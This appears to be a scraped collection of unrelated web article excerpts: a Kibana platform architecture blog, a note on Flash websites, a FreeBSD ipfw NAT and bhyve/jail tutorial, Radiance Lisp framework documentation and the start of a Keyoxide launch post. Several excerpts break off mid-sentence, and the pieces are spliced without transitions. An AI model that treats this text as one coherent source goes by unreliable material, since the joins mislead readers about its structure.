</p><p>Fast forward a few years and Kibana comprised a whopping 97 plugins and was actively worked on by over 100 Elastic developers. Kibana had become one of the largest open source JavaScript apps in the world. The simple architecture we had built was starting to bow under this weight. Writing cross-application integrations was difficult, unintended breakages were common, development performance was poor, and ramping up new developers on Kibana was difficult.
</p><p>Our patchwork system of solutions had finally taken us as far as it could and it was clear we needed to think again from first principles. A group of Kibana engineers set out to design a new system that could scale with Kibana, our team, and the community: the Kibana development platform.
</p> <p><strong><h2>The Kibana development platform, a grown-up application framework</h2></strong> <strong><h3>Goals</h3></strong></p><p>The primary goal of the Kibana platform project was to increase both the velocity and stability of adding new features. To fulfill this goal, we needed to make Kibana’s codebase easy to change, easy to learn, and easy to thoroughly test.
</p><p>To achieve these goals we produced a list of features that this new architecture should have:
</p><ul><li>Consistent architecture across client and server code</li><li>A small, explicit set of foundational APIs that is separate from plugin code</li><li>Simple and well-defined plugin runtime and execution flow</li><li>Isolated plugins with explicit APIs and dependencies</li><li>Framework-agnostic and futureproof APIs</li><li>Full test coverage</li><li>Type safety</li></ul> <p><strong><h3>Microservices</h3></strong></p><p>One of the key problems with our legacy code was how much it was slowing down individual teams from iterating quickly.
</p><p>The popular microservices trend is often the recommended pattern to reach for when re-architecting a system to solve this problem. By breaking up responsibilities into independent systems with clear boundaries, each team can work within their domains with fewer cross-cutting concerns.
</p><p>Microservices proper aren’t an option for Kibana, which is deployed as a single artifact on millions of our customers’ own machines. Simple deployment and configuration is a goal of all products at Elastic. Breaking up Kibana into smaller, separate deployments would complicate that.
</p><p>However, similar benefits can be realized by enabling strict encapsulation between components. The original Kibana architecture allowed for many components to affect the entire system, often in unexpected ways. By facilitating and enforcing encapsulation with explicit boundaries and dependencies between subsystems, we focused on achieving many of the same benefits without complicating our deployment story.
</p><p>We see the Kibana platform as a hybrid approach: a single artifact that you can download and run on your laptop, but built with explicit boundaries between its pluggable systems.
</p><p>With this design, we avoid the complexity of deploying microservices and handling network failures, while still promoting the isolation between systems that enables teams to move quickly.
</p> <p><strong><h2>Key aspects of the Kibana platform</h2></strong> <strong><h3>Core</h3></strong></p><p>The Kibana core is the root system that boots Kibana, validates configuration, loads plugins, and provides the primitive APIs needed to build a plugin in Kibana. When you run <code>./bin/kibana</code> or load Kibana in your browser this is the system that starts executing first.
</p><p>The core is made up of a set of <strong>services</strong>, each of which provides APIs to plugins at different points of the system’s lifecycle. Core services are always present and cannot be disabled. Anything we consider to be essential to building a Kibana plugin exists as a core service.
</p><p>The underlying implementation details of core services are encapsulated and hidden from plugins. This yields a number of benefits, not the least of which is high test coverage. By only allowing plugins access to purpose-built features, we can ensure that the core’s small API surface is incredibly robust.
</p><p>The core also aims to be framework and technology agnostic. We want this platform to grow with the project for years to come. Locking the entire project into one technology has bitten us in the past (Angular.js, Hapi.js) and is a decision we plan to avoid going forward. When possible, we prefer to provide primitives or well-formed abstractions over specific frameworks. For instance, applications in the Kibana platform can be written using virtually any UI framework (though we prefer React and our EUI library) and our HTTP interface is a very generic abstraction over Hapi.js. This allows plugins to experiment with and adopt new technologies and allows the core to remove underlying frameworks without breaking the interface provided to plugins.
</p> <p><strong><h3>Plugins</h3></strong></p><p>While the core provides the foundation of Kibana, plugins are where the magic happens. Virtually every feature you use in Kibana is built inside of a plugin. In general, a plugin is a group of functionalities that can be toggled on or off to provide features and apps in Kibana.
</p><p>Plugins have access to all of the APIs exposed by core services. But the really neat thing about plugins is that they may have dependencies on other plugins. This allows plugins to integrate at runtime via explicit contracts that these plugins expose to one another. Plugins can expose something as simple as a small integration API or provide a feature-rich service to other plugins. This allows us to keep adding new services to Kibana without expanding the API surface of the core. By baking this feature into the platform’s design, we can make sure that changes to these interfaces are well understood and communicated.
</p><p>So what can a plugin do? Well, they can register HTTP endpoints and UI applications, query and create data in Elasticsearch, and provide generic services to other plugins. In other words, quite a bit.
</p> <p><strong><h3>Lifecycles</h3></strong></p><p>All core services and plugins are organized and executed in the same set of lifecycle stages: setup, start, and stop. Both the client and server execute these lifecycle stages sequentially when starting Kibana.
</p><p>Different sets of functionality are available during each lifecycle stage. It is up to each service and plugin to return the APIs it wishes to expose during these lifecycle stages for other services and plugins to consume.
</p><p>By organizing all of Kibana around these stages, we make reasoning about <em>when</em> code will execute much simpler and have tight control over which features are available to other components at different points in time.
</p> <p><strong><h3>Server and browser</h3></strong></p><p>Up until this point we’ve talked about the core as if it’s a single system. However, that isn’t <em>quite</em> true. In reality, we have a server-side and client-side core. Each follows a similar design but is made up of a slightly different set of services.
</p><p>As you might expect, the server-side services provide typical backend functionality, like HTTP routes, while the client-side services provide frontend functionality, like UI mounting. But while the set of APIs is different, both systems share the same design, patterns, and lifecycle stages.
</p><p>This makes learning how to build a Kibana plugin much simpler. In legacy Kibana, developers had to learn about Hapi’s plugin system on the server and Angular’s module system in the browser. Developers today can learn a single pattern for building plugins that is portable between the two environments.
</p> <p><strong><h2>Results</h2></strong></p><p>Leveraging this design, the Kibana teams have been incrementally migrating their plugins to the Kibana platform APIs over the past several minor versions. Today, we’re happy to report that all applications will be running on the platform as of version 7.9.0 (coming soon).
</p><p>One of the biggest improvements users of Kibana will notice with this change is a much faster navigation experience between applications. We have removed the “loading screen of death” (as some call it) when switching between applications, enabling you to quickly find, analyze, and share your data. In 7.9, you will be able to flip between Dashboard, Maps, Canvas, APM, and all your other favorite Kibana apps nearly instantly! Gone are the days of the loading screen breaking your flow.
</p><p><img src="https://play.vidyard.com/WeKZ5mfwug3ng8gDPjSZgE.jpg" data-uuid="WeKZ5mfwug3ng8gDPjSZgE" data-v="4" data-type="inline" data-autoplay="1" data-loop="1" data-hidden_controls="1" data-muted="0" muted=""></p><p>But this is just the beginning. Developers at Elastic are now able to build features faster, more efficiently, and produce better code. For Kibana users, this translates to more features in every release!

</p> <p><strong><h2>Further reading for plugin developers</h2></strong></p><p>As we’ve rolled out these changes, we’ve introduced significant changes to our experimental plugin API available to non-Elastic plugin developers. If you are a developer that maintains a Kibana plugin, you will need to update your plugin to work with future versions of Kibana. Our incremental approach has led to churn in the experimental API and we generally recommend …</p></div></div></div></div></div>

          <p>Now it’s abandoned, but a lot of websites were built on FLASH technologies.</p>
          <p>Basic HTML technologies didn’t provide enough tools and methods for designers to express their ideas and FLASH which was used commonly to create an animation and interactive presentations stepped into the Web.</p>
          <p>For designers who wanted to do web — FLASH websites were the breath of fresh air. Everything you can imagine was possible — from complex interactive animations to 3D.</p>
          <p>The main source of inspiration was thefwa.com and it was an honor to add an FWA label on a website.</p>
          <p>Sounds good, right? But what happened with FLASH then? Well, briefly it wasn’t secure, it was heavy to load, Apple effect and HTML5.</p>
          <p>Unfortunately, I can’t provide any links to you, because you can’t open them, FLASH technology is deadly dead right now.</p>
          <p>It’s hard to imagine right now but FLASH was a big part of the internet not so far ago — websites, games, banners and I think that more than 50% of all designers portfolio was built on FLASH.</p>

		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET

          |
          |

</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

It should let you write personal websites and generally deployable applications easily and in such a way that they can be used on practically any setup without having to undergo special adaptations.</p> <h2 id="getting_it">Getting It</h2> <p>Radiance and associated modules and applications are distributed via Quicklisp in a separate dist. To install Radiance, do:</p> <pre><code>(ql-dist:install-dist "http://dist.tymoon.eu/shirakumo.txt")
(ql:quickload :radiance)
</code></pre> <p>From there on out you should be able to load and use any kind of Radiance module like <a href="https://github.com/Shirakumo/purplish">Purplish</a> directly via Quicklisp's <code>quickload</code>.</p> <h2 id="a_lengthy_and_in-depth_example">A Lengthy and In-Depth Example</h2> <p>You can find a tutorial that introduces Radiance and most of the important concepts, and explores how to write a web application in general, <a href="https://github.com/Shirakumo/radiance-tutorial/blob/master/Part%200.md">here</a>. It should give you a good feeling for how to go about things, and give you pointers about where to look if you need a particular feature. In the last part it'll also go into the actual setup and deployment of a Radiance installation on a production server.</p> <h2 id="a_simple_example">A Simple Example</h2> <p>The most basic thing you most likely want to do is serve some kind of HTML. So let's work towards that and gradually extend it. Before we can begin, we need to start up Radiance.</p> <pre><code>(ql:quickload :radiance)
(<a href="#FUNCTION%20RADIANCE-CORE%3ASTARTUP">radiance:startup</a>)</code></pre> <p>If this is your first time setting up Radiance, you'll get a note about it using the <code>r-welcome</code> module. It should also give you a link that you can open in your browser to see a little greeting page. For now we'll just want to put up our own little page alongside it.</p> <pre><code>(<a href="http://l1sp.org/cl/in-package">in-package</a> :rad-user)

(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (setf (<a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3A%28SETF%20CONTENT-TYPE%29">content-type</a> <a href="#VARIABLE%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a>) "text/plain") 
  "Hi!")</code></pre> <p>Visiting <a href="http://localhost:8080/example">localhost:8080/example</a> should now just show "Hi". Rather boring indeed. So let's spit out some HTML instead. For now, we'll use <a href="http://weitz.de/cl-who/">cl-who</a> since it is very simple.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>A recompile and refresh later and we have some font styling going on. Next we'll probably want to add a CSS file to it to style it properly. We could serve the CSS using another page as well, but that isn't the best way to go about things in the long term.</p> <p>Let's instead look at how to create a module, which will allow us to organise things in a more orderly fashion. You can create the files for a module manually, but for now we'll settle with an automatically generated skeleton that Radiance can provide you with.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3ACREATE-MODULE">create-module</a> "example")</code></pre> <p>It should return you a path on which the module resides. It should contain an ASDF system, a main lisp file, and two folders, <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> and <code>template</code>. Surprisingly enough, the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder is where statically served files go, and <code>template</code> is for template documents, if you happen to use a template system.</p> <p>Let's open up the <code>example.lisp</code> and carry over our example page from it.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Pages are identified by a name symbol. Since we now have our own module, and thus our own package, the example symbol above won't be the same as the one we've used before. We'll just have to remove the page in the <code>rad-user</code> package to avoid the clash.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3AREMOVE-PAGE">remove-page</a> 'rad-user::example)</code></pre> <p>Next let's create a simple CSS file to spruce things up a little. The file will be <code>example.css</code> placed in the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder. Here's a sample CSS if you don't want to write your own.</p> <pre><code>body{
    font-family: sans-serif;
    font-size: 12pt;
    background: #EEE;
}

header{
    text-align: center;
}

main{
    width: 800px;
    margin: 0 auto 0 auto;
    background: #FFF;
    padding: 10px;
    border: 1px solid #BBB;
    border-radius: 5px;
}</code></pre> <p>Next we need to modify our HTML to actually link to the style sheet. In order to get the address to the stylesheet we'll have to make use of Radiance's routing system. Don't worry though, it's not much of a hassle.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page")
             (:link :rel "stylesheet" :type "text/css" 
                    :href (<a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a> "/static/example/example.css" :representation :external)))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Refresh the page, and voilà, now it's got some pizzazz to it too. You'll probably want an explanation for the whole <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> business. Explaining it in full is handled by the sections following this one, but the gist of it is that it ensures that the link to the static file is properly resolved under any setup.</p> <h2 id="1._radiance_concepts_&amp;_parts">1. Radiance Concepts &amp; Parts</h2> <h3 id="1.1_uri">1.1 URI</h3> <p>One of the most central concepts in Radiance is that of a URI. A URI is an object that consists of a list of domains, an optional port number, and a path (see <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>). It is essentially a stripped down version of a general URI, and as such doesn't include a schema, query, or fragment part. Another important difference is that the <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code> URIs are used at several points throughout the framework, both to capture locations and to handle dispatch matching.</p> <p>Note that URIs are mutable. This is important for performance, as URI modifications have to happen in several parts that lie on the critical path. However, in the usual case it is not expected that URIs are modified outside of a few select functions. Modifying a URI's parts in unexpected ways may lead to strange behaviour.</p> <p>URIs have a unique string representation and can be serialised to string and parsed back into a full URI object again. URIs can also be dumped to FASL files as literals, so emitting them from macros is fine. The syntax for a URI is as follows:</p> <pre><code>URI     ::= DOMAINS? (':' PORT)? '/' PATH?
DOMAINS ::= DOMAIN ('.' DOMAIN)*
DOMAIN  ::= ('a'..'Z' | '0'..'9' | '-')
PORT    ::= ('0'..'9'){1, 5}
PATH    ::= .*</code></pre> <p>You can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> to turn a URI into a concrete URL. Reversal, encoding, and proper formatting of all the parts is handled for you automatically there.</p> <p>See <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APORT">port</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AMATCHER">matcher</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-STRING">uri-string</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URI">make-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URL">make-url</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AENSURE-URI">ensure-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOPY-URI">copy-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APARSE-URI">parse-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3C">uri&lt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3E">uri&gt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3D">uri=</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-MATCHES">uri-matches</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMERGE-URIS">merge-uris</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREPRESENT-URI">represent-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code>.</p> <h3 id="1.2_request_and_response">1.2 Request and Response</h3> <p>In order to encapsulate the data that is sent to  and from, we have the idea of a Request (<code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>) and Response (<code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>) object. The Request object holds the URI that represents to which location the request goes, and all the data contained in the HTTP payload like post, get, header, and cookie variables. The Response object holds the return-code, headers, cookies, and the actual body data.</p> <p>During the processing of a request, these two objects must always be present and bound to the <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code> and <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code> variables. They encapsulate a lot of very vital information that is necessary to generate dynamic pages. Additionally, the Request contains an opaque <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code> table in which you can store arbitrary data. This is useful when you need to exchange pieces of information between individual parts of the system that may be reached during the request execution.</p> <p>Requests don't necessarily have to come from the HTTP server. In order to test things you can also construct a request yourself and send it out programmatically. Whatever the case, the primary interface to dispatch a request is called <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>. This will construct a Request and Response object for you and appropriately handle the URI. If you want to do that yourself and <em>really</em> just send out a complete Request object, you can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>.</p> <p>For the actual handling of a request, see dispatchers, pages, and API endpoints.</p> <p>See <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-EXTERNAL-FORMAT%2A">*default-external-format*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-CONTENT-TYPE%2A">*default-content-type*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-METHOD">http-method</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APOST-DATA">post-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AGET-DATA">get-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AUSER-AGENT">user-agent</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREFERER">referer</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AREMOTE">remote</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AISSUE-TIME">issue-time</a></code>, <code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ARETURN-CODE">return-code</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACONTENT-TYPE">content-type</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXTERNAL-FORMAT">external-format</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ANAME">name</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AVALUE">value</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXPIRES">expires</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-ONLY">http-only</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ASECURE">secure</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE-HEADER">cookie-header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AGET-VAR">get-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST-VAR">post-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST%2FGET">post/get</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHEADER">header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AFILE">file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREDIRECT">redirect</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ASERVE-FILE">serve-file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST-RUN-TIME">request-run-time</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEBUGGER%2A">*debugger*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHANDLE-CONDITION">handle-condition</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ARENDER-ERROR-PAGE">render-error-page</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>, <code>set-data</code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code></p> <h3 id="1.3_route">1.3 Route</h3> <p>Before a Request can be dispatched on, it goes through something called the routing system. Unlike in other frameworks, where 'routes' designate what handles a request, in Radiance a Route (<code><a href="#FUNCTION%20RADIANCE-CORE%3AROUTE">route</a></code>) is a form of URI translator. This part of the system is what's responsible for creating and upholding two "universes", an internal and an external one.</p> <p>The internal universe is the one actual web applications live in. The external universe is the one the HTTP server and a user of the website lives in. This distinction is necessary in order to allow you to, one one hand, write web applications without having to worry about what a potential setup on a server might look like at some point. You don't have to worry about what kind of domain, port, path setup may be necessary to run your application. On the other hand, it allows you, as a webadmin, to customise and run the system to your exact desires without fear of breaking things.</p> <p>This all is facilitated by routes, of which there are two kinds: mapping, and reversal routes. Mapping routes are responsible for turning a URI from the external universe into one of the internal universe. Usually this involves cutting away the top-level domain and perhaps doing a mapping of subdomains. Reversal routes do the opposite-- they go from the internal universe to the external. This is necessary in order to make links in your served pages refer to …</p></section></article></div>

<br/>
July 1, 2020 | https://yarmo.eu/post/keyoxide | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/keyoxide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, I'm excited to launch <a href="https://keyoxide.org/">Keyoxide.org</a>, the lightweight and FOSS solution to make basic cryptography operations accessible to regular humans.</p>
<h2>What is Keyoxide.org?</h2>
<p><a href="https://keyoxide.org/">Keyoxide.org</a> offers easy encryption, signature verification and decentralized identity proof verification based on PGP keys while demanding little in-depth knowledge about the underlying encryption program from its users.</p>
<p>This project aims to offer comparable functionality as services like <a href="https://keybase.io/">Keybase</a> while reducing friction and being more open.</p>
<p>The project is MIT licensed, uses <a href="https://github.com/openpgpjs/openpgpjs">openpgpjs</a> and is hosted on <a href="https://codeberg.org/yarmo/keyoxide">Codeberg</a>.</p>
<h2>Why only encryption and signature verification?</h2>
<p>These are the operations that are available when only having access to public keys instead of private keys. If you wish to decrypt messages and sign them, you need a keypair. If you have a keypair, you probably have the knowledge to use dedicated tools like the CLI or Kleopatra. And if you do, you probably won't be using <a href="https://keyoxide.org/">Keyoxide.org</a> directly yourself.</p>
<p>Indeed, if you possess a PGP keypair, <a href="https://keyoxide.org/">Keyoxide.org</a> is the tool you send to others to interact with your public key more easily. Allow them to encrypt a message for you, to verify one of your signatures, to verify your online identities using decentralized proofs.</p>
